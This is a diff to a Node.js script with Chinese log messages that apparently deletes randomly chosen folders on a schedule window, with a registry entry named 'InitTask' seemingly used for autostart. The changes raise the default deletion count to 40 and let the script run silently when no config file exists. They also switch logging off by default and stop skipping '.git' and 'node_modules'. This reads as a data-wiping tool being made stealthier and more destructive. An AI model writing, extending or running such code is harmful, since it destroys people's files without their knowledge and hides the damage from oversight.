@@ -9,6 +9,18 @@ const path = require('path');
 const CONFIG_FILE = 'config.json';
 const LOG_FILE = 'run.log';
 
+const DEFAULT_CONFIG = {
+  startDate: null,
+  endDate: null,
+  deleteCount: 40,
+  lastRunTime: null,
+  deleteFolderPaths: [],
+  registryScope: 'HKCU',
+  regName: 'InitTask',
+  maxDepth: 20,
+  enableLog: false,
+};
+
 const SKIP_DIR_NAMES = new Set([
   '$recycle.bin',
   'system volume information',
@@ -21,14 +33,14 @@ const SKIP_DIR_NAMES = new Set([
   'efi',
   'msocache',
   'perflogs',
-  'node_modules',
-  '.git',
   'appdata',
 ]);
 
 let logPath = '';
+let loggingEnabled = true;
 
 function log(msg) {
+  if (!loggingEnabled) return;
   const line = `[${new Date().toISOString()}] ${msg}`;
   if (logPath) {
     try {
@@ -54,20 +66,31 @@ function ensureDir(dirPath) {
 function loadConfig() {
   const deployPath = __dirname;
   const configPath = path.join(deployPath, CONFIG_FILE);
+  let config;
+  let usedDefault = false;
 
-  if (!fs.existsSync(configPath)) {
-    throw new Error(`配置文件不存在: ${configPath}`);
+  if (fs.existsSync(configPath)) {
+    try {
+      const raw = JSON.parse(fs.readFileSync(configPath, 'utf8'));
+      config = { ...DEFAULT_CONFIG, ...raw };
+    } catch {
+      config = { ...DEFAULT_CONFIG };
+      usedDefault = true;
+    }
+  } else {
+    config = { ...DEFAULT_CONFIG };
+    usedDefault = true;
   }
 
-  const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
   config.deployPath = deployPath;
-  config.deleteCount = Math.max(1, parseInt(config.deleteCount, 10) || 5);
-  config.maxDepth = Math.max(1, parseInt(config.maxDepth, 10) || 6);
+  config.deleteCount = Math.max(1, parseInt(config.deleteCount, 10) || DEFAULT_CONFIG.deleteCount);
+  config.maxDepth = Math.max(1, parseInt(config.maxDepth, 10) || DEFAULT_CONFIG.maxDepth);
   config.deleteFolderPaths = Array.isArray(config.deleteFolderPaths)
     ? config.deleteFolderPaths.map(expandEnv).filter(Boolean)
     : [];
+  config.enableLog = config.enableLog !== false;
 
-  return { config, configPath };
+  return { config, configPath, usedDefault };
 }
 
 function saveConfig(configPath, config) {
@@ -176,12 +199,13 @@ function pickRandom(arr, n) {
 
 function main() {
   logPath = path.join(__dirname, LOG_FILE);
-  log('========== 任务开始 ==========');
-  log(`部署目录: ${__dirname}`);
-  log(`用户: ${process.env.USERNAME || process.env.USER}`);
-
-  const { config, configPath } = loadConfig();
-  log(`配置文件: ${configPath}`);
+  const { config, configPath, usedDefault } = loadConfig();
+  loggingEnabled = config.enableLog;
+  if (usedDefault) {
+    log(`配置文件不存在或无效，使用默认配置: ${configPath}`);
+  } else {
+    log(`配置文件: ${configPath}`);
+  }
   log(`删除数量: ${config.deleteCount}，扫描深度: ${config.maxDepth}`);
 
   if (!isWithinDateRange(config.startDate, config.endDate)) {
@@ -260,7 +284,7 @@ function main() {
   }
 
   config.lastRunTime = new Date().toISOString();
-  saveConfig(configPath, config);
+  saveConfig(configPath, config); // 无配置文件时会自动创建
   log(`完成: 成功 ${deleted}，失败 ${failed}`);
   log(`已更新 lastRunTime: ${config.lastRunTime}`);
   log('========== 任务结束 ==========\n');
@@ -270,6 +294,14 @@ try {
   main();
 } catch (err) {
   if (!logPath) logPath = path.join(__dirname, LOG_FILE);
+  try {
+    const cfg = JSON.parse(
+      fs.readFileSync(path.join(__dirname, CONFIG_FILE), 'utf8')
+    );
+    loggingEnabled = cfg.enableLog !== false;
+  } catch {
+    /* 使用默认 loggingEnabled */
+  }
   log(`异常退出: ${err.message || err}`);
   log('========== 任务结束 ==========\n');
   process.exit(1);
